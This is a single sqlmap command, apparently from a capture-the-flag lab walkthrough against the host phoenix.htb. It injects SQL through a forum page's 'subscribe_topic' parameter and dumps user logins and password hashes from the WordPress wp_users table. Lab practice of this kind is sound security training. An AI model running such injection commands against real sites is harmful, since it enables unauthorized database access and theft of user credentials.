sqlmap  -u "https://phoenix.htb/forum/?subscribe_topic=1" \
        -p "subscribe_topic" -D wordpress -T wp_users -C user_login,user_pass \
        --batch --dump
